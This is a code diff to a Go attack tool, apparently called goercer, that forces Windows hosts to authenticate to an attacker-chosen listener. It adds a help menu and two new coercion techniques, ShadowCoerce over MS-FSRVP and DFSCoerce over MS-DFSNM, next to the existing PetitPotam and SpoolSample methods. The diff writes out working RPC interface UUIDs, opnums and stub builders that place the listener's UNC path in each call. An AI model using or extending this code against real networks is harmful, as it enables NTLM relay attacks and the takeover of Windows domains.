@@ -120,10 +120,34 @@ type CoercionMethod struct {
 }
 
 func main() {
+	// Check for help flag
+	for _, arg := range os.Args[1:] {
+		if arg == "-h" || arg == "--help" {
+			fmt.Println("Usage: goercer <target_ip> <listener_ip> <username> <password> <domain> [method] [pipe]")
+			fmt.Println()
+			fmt.Println("Methods:")
+			fmt.Println("  petitpotam     - MS-EFSRPC coercion (default)")
+			fmt.Println("  spoolsample    - MS-RPRN print spooler coercion")
+			fmt.Println("  shadowcoerce   - MS-FSRVP volume shadow copy coercion")
+			fmt.Println("  dfscoerce      - MS-DFSNM DFS namespace coercion")
+			fmt.Println()
+			fmt.Println("Pipes (for petitpotam only):")
+			fmt.Println("  lsarpc (default), efsr, samr, netlogon, lsass")
+			fmt.Println()
+			fmt.Println("Examples:")
+			fmt.Println("  ./goercer <target> <listener> <user> <pass> <domain> petitpotam")
+			fmt.Println("  ./goercer <target> <listener> <user> <pass> <domain> petitpotam efsr")
+			fmt.Println("  ./goercer <target> <listener> <user> <pass> <domain> spoolsample")
+			os.Exit(0)
+		}
+	}
+
 	if len(os.Args) < 6 {
 		fmt.Println("Usage: goercer <target_ip> <listener_ip> <username> <password> <domain> [method] [pipe]")
-		fmt.Println("Methods: petitpotam (default), spoolsample")
+		fmt.Println("Methods: petitpotam (default), spoolsample, shadowcoerce, dfscoerce")
 		fmt.Println("Pipes (for petitpotam): lsarpc (default), efsr, samr, netlogon, lsass")
+		fmt.Println()
+		fmt.Println("Use -h or --help for more information")
 		os.Exit(1)
 	}
 
@@ -187,6 +211,16 @@ func main() {
 			fmt.Println("[!] Note: Custom pipe parameter ignored for SpoolSample (only works on \\pipe\\spoolss)")
 		}
 		err = executeSpoolSample(session, share, auth, listenerIP, targetIP)
+	case "shadowcoerce":
+		if pipeName != "lsarpc" {
+			fmt.Println("[!] Note: Custom pipe parameter ignored for ShadowCoerce (only works on \\pipe\\FssagentRpc)")
+		}
+		err = executeShadowCoerce(session, share, auth, listenerIP)
+	case "dfscoerce":
+		if pipeName != "lsarpc" {
+			fmt.Println("[!] Note: Custom pipe parameter ignored for DFSCoerce (only works on \\pipe\\netdfs)")
+		}
+		err = executeDFSCoerce(session, share, auth, listenerIP)
 	// Future coercion methods can be added here:
 	// case "printerbug":
 	//     err = executePrinterBug(session, share, auth, listenerIP)
@@ -353,6 +387,142 @@ func executeSpoolSample(session *smb.Connection, share string, auth *NTLMAuth, l
 			continue
 		}
 
+		err = sendAuthenticatedRequest(pipe, auth, opnum, stub)
+
+		if err != nil {
+			if err.Error() == "got fault 0x5" {
+				fmt.Printf("[-] Opnum %d returned ACCESS_DENIED (probably patched)\n", opnum)
+			} else if err.Error() == "got ERROR_BAD_NETPATH (0x6f7) - attack likely worked" {
+				fmt.Printf("[+] Opnum %d got ERROR_BAD_NETPATH - coercion successful!\n", opnum)
+				successfulOpnum = int(opnum)
+			}
+			lastErr = err
+		} else {
+			fmt.Printf("[+] Opnum %d completed successfully\n", opnum)
+			successfulOpnum = int(opnum)
+			lastErr = nil
+		}
+	}
+
+	if successfulOpnum >= 0 {
+		fmt.Printf("[+] Coercion triggered via opnum %d\n", successfulOpnum)
+	}
+
+	return lastErr
+}
+
+// executeShadowCoerce implements the ShadowCoerce coercion technique (MS-FSRVP)
+func executeShadowCoerce(session *smb.Connection, share string, auth *NTLMAuth, listenerIP string) error {
+	fmt.Printf("[*] Using ShadowCoerce coercion technique via \\pipe\\FssagentRpc\n")
+
+	// Define ShadowCoerce method parameters
+	method := CoercionMethod{
+		Name:         "ShadowCoerce",
+		PipeName:     "FssagentRpc",
+		UUID:         "a8e0653c-2744-4389-a61d-7373df8b2292",
+		MajorVersion: 1,
+		MinorVersion: 0,
+		Opnums:       []uint16{8, 9}, // IsPathSupported (8), IsPathShadowed (9)
+		CreateStub:   createShadowCoerceStub,
+	}
+
+	// Open named pipe with read+write access
+	opts := smb.NewCreateReqOpts()
+	opts.DesiredAccess = smb.FAccMaskFileReadData | smb.FAccMaskFileWriteData |
+		smb.FAccMaskFileReadEA | smb.FAccMaskFileReadAttributes |
+		smb.FAccMaskReadControl | smb.FAccMaskSynchronize
+
+	pipe, err := session.OpenFileExt(share, method.PipeName, opts)
+	if err != nil {
+		return fmt.Errorf("failed to open pipe %s: %v", method.PipeName, err)
+	}
+	defer pipe.CloseFile()
+
+	fmt.Printf("[+] Pipe %s opened, starting DCERPC auth...\n", method.PipeName)
+
+	// Perform authenticated DCERPC bind (3-way handshake)
+	err = performAuthenticatedBind(&pipe, session, share, method.PipeName, method.UUID, method.MajorVersion, method.MinorVersion, auth)
+	if err != nil {
+		return fmt.Errorf("DCERPC auth bind failed: %v", err)
+	}
+
+	fmt.Println("[+] DCERPC authentication complete!")
+
+	// Try all opnums
+	var lastErr error
+	successfulOpnum := -1
+	for _, opnum := range method.Opnums {
+		fmt.Printf("[-] Trying %s opnum %d...\n", method.Name, opnum)
+
+		stub := method.CreateStub(listenerIP, opnum)
+		err = sendAuthenticatedRequest(pipe, auth, opnum, stub)
+
+		if err != nil {
+			if err.Error() == "got fault 0x5" {
+				fmt.Printf("[-] Opnum %d returned ACCESS_DENIED (probably patched)\n", opnum)
+			} else if err.Error() == "got ERROR_BAD_NETPATH (0x6f7) - attack likely worked" {
+				fmt.Printf("[+] Opnum %d got ERROR_BAD_NETPATH - coercion successful!\n", opnum)
+				successfulOpnum = int(opnum)
+			}
+			lastErr = err
+		} else {
+			fmt.Printf("[+] Opnum %d completed successfully\n", opnum)
+			successfulOpnum = int(opnum)
+			lastErr = nil
+		}
+	}
+
+	if successfulOpnum >= 0 {
+		fmt.Printf("[+] Coercion triggered via opnum %d\n", successfulOpnum)
+	}
+
+	return lastErr
+}
+
+// executeDFSCoerce implements the DFSCoerce coercion technique (MS-DFSNM)
+func executeDFSCoerce(session *smb.Connection, share string, auth *NTLMAuth, listenerIP string) error {
+	fmt.Printf("[*] Using DFSCoerce coercion technique via \\pipe\\netdfs\n")
+
+	// Define DFSCoerce method parameters
+	method := CoercionMethod{
+		Name:         "DFSCoerce",
+		PipeName:     "netdfs",
+		UUID:         "4fc742e0-4a10-11cf-8273-00aa004ae673",
+		MajorVersion: 3,
+		MinorVersion: 0,
+		Opnums:       []uint16{12, 13}, // NetrDfsAddStdRoot (12), NetrDfsRemoveStdRoot (13)
+		CreateStub:   createDFSCoerceStub,
+	}
+
+	// Open named pipe with read+write access
+	opts := smb.NewCreateReqOpts()
+	opts.DesiredAccess = smb.FAccMaskFileReadData | smb.FAccMaskFileWriteData |
+		smb.FAccMaskFileReadEA | smb.FAccMaskFileReadAttributes |
+		smb.FAccMaskReadControl | smb.FAccMaskSynchronize
+
+	pipe, err := session.OpenFileExt(share, method.PipeName, opts)
+	if err != nil {
+		return fmt.Errorf("failed to open pipe %s: %v", method.PipeName, err)
+	}
+	defer pipe.CloseFile()
+
+	fmt.Printf("[+] Pipe %s opened, starting DCERPC auth...\n", method.PipeName)
+
+	// Perform authenticated DCERPC bind (3-way handshake)
+	err = performAuthenticatedBind(&pipe, session, share, method.PipeName, method.UUID, method.MajorVersion, method.MinorVersion, auth)
+	if err != nil {
+		return fmt.Errorf("DCERPC auth bind failed: %v", err)
+	}
+
+	fmt.Println("[+] DCERPC authentication complete!")
+
+	// Try all opnums
+	var lastErr error
+	successfulOpnum := -1
+	for _, opnum := range method.Opnums {
+		fmt.Printf("[-] Trying %s opnum %d...\n", method.Name, opnum)
+
+		stub := method.CreateStub(listenerIP, opnum)
 		err = sendAuthenticatedRequest(pipe, auth, opnum, stub)
 
 		if err != nil {
@@ -1619,6 +1789,118 @@ func createRpcRemoteFindFirstPrinterChangeNotificationStub(listenerIP string, pr
 
 	// pBuffer (NULL)
 	binary.Write(&buf, binary.LittleEndian, uint32(0)) // NULL pointer
+
+	return buf.Bytes()
+}
+
+// createShadowCoerceStub creates the stub for MS-FSRVP calls (ShadowCoerce)
+// Works for IsPathSupported (opnum 8) and IsPathShadowed (opnum 9)
+func createShadowCoerceStub(listenerIP string, opnum uint16) []byte {
+	// Build UNC path with null terminator
+	uncPath := "\\\\" + listenerIP + "\\share\x00"
+
+	var buf bytes.Buffer
+
+	// Convert to UTF-16LE
+	utf16Path := stringToUTF16LE(uncPath)
+	lenChars := uint32(len([]rune(uncPath)))
+
+	// ShareName parameter (conformant varying string)
+	// Max count
+	binary.Write(&buf, binary.LittleEndian, lenChars)
+	// Offset
+	binary.Write(&buf, binary.LittleEndian, uint32(0))
+	// Actual count
+	binary.Write(&buf, binary.LittleEndian, lenChars)
+
+	// String data
+	buf.Write(utf16Path)
+
+	// Padding to 4-byte boundary
+	totalSoFar := 12 + len(utf16Path)
+	padding := (4 - (totalSoFar % 4)) % 4
+	for i := 0; i < padding; i++ {
+		buf.WriteByte(0x00)
+	}
+
+	return buf.Bytes()
+}
+
+// createDFSCoerceStub creates the stub for MS-DFSNM calls (DFSCoerce)
+// Works for NetrDfsAddStdRoot (opnum 12) and NetrDfsRemoveStdRoot (opnum 13)
+func createDFSCoerceStub(listenerIP string, opnum uint16) []byte {
+	// Build server name and share name
+	serverName := "\\\\" + listenerIP + "\x00"
+	shareName := "share\x00"
+	comment := "comment\x00"
+
+	var buf bytes.Buffer
+
+	// Convert to UTF-16LE
+	utf16Server := stringToUTF16LE(serverName)
+	utf16Share := stringToUTF16LE(shareName)
+	utf16Comment := stringToUTF16LE(comment)
+	lenServerChars := uint32(len([]rune(serverName)))
+	lenShareChars := uint32(len([]rune(shareName)))
+	lenCommentChars := uint32(len([]rune(comment)))
+
+	// ServerName parameter (conformant varying string)
+	// Max count
+	binary.Write(&buf, binary.LittleEndian, lenServerChars)
+	// Offset
+	binary.Write(&buf, binary.LittleEndian, uint32(0))
+	// Actual count
+	binary.Write(&buf, binary.LittleEndian, lenServerChars)
+	// String data
+	buf.Write(utf16Server)
+
+	// Padding to 4-byte boundary
+	totalSoFar := 12 + len(utf16Server)
+	padding := (4 - (totalSoFar % 4)) % 4
+	for i := 0; i < padding; i++ {
+		buf.WriteByte(0x00)
+	}
+
+	// RootShare parameter (conformant varying string)
+	// Max count
+	binary.Write(&buf, binary.LittleEndian, lenShareChars)
+	// Offset
+	binary.Write(&buf, binary.LittleEndian, uint32(0))
+	// Actual count
+	binary.Write(&buf, binary.LittleEndian, lenShareChars)
+	// String data
+	buf.Write(utf16Share)
+
+	// Padding to 4-byte boundary
+	totalSoFar = 12 + len(utf16Share)
+	padding = (4 - (totalSoFar % 4)) % 4
+	for i := 0; i < padding; i++ {
+		buf.WriteByte(0x00)
+	}
+
+	// Comment parameter - different for each opnum
+	if opnum == 12 {
+		// NetrDfsAddStdRoot needs Comment parameter
+		// Max count
+		binary.Write(&buf, binary.LittleEndian, lenCommentChars)
+		// Offset
+		binary.Write(&buf, binary.LittleEndian, uint32(0))
+		// Actual count
+		binary.Write(&buf, binary.LittleEndian, lenCommentChars)
+		// String data
+		buf.Write(utf16Comment)
+
+		// Padding to 4-byte boundary
+		totalSoFar = 12 + len(utf16Comment)
+		padding = (4 - (totalSoFar % 4)) % 4
+		for i := 0; i < padding; i++ {
+			buf.WriteByte(0x00)
+		}
+	}
+	// NetrDfsRemoveStdRoot (opnum 13) doesn't have Comment parameter
+
+	// ApiFlags parameter (0)
+	binary.Write(&buf, binary.LittleEndian, uint32(0))
 
 	return buf.Bytes()
 }
